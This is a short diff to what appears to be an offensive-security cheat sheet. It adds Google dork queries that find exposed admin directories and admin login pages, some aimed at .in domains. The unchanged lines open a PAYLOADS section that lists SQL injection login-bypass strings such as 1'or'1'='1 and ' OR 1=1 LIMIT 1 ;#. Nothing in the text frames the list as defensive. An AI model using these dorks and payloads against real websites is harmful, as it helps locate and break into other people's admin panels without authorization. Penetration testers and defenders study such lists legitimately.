@@ -75,6 +75,22 @@ Two
 - inurl:-admin/login.php
 - inurl:*-admin/index.php
 - inurl:-admin/admin.php
+- intitle:"index" of "admin" site:
+- intitle:"index" of "admin" "framework" site:.in
+- intitle:"index" of "admin" "pdf" site:
+- intitle:"index" of "admin" "gallery" site:
+- intitle:"index" of "admin" "image" site:
+- intitle:"index" of "admin" "upload" site:
+- intitle:"index" of "admin" "banner" site:
+- intitle:"index" of "admin" "file" site:
+- intitle:"index" of "admin" "page" site:
+- intitle:"index" of "admin" "news" site:
+- intitle:"index" of "admin" "views" site:
+- intitle:"index" of "admin" "include" site:
+- intitle:"index" of "admin" "picture" site:
+- intitle:"index" of "admin" "photos" site:
+- inurl: admin/login.php site:.in
+
 ## PAYLOADS
 - 1'or'1'='1
 - ' OR 1=1 LIMIT 1 ;#
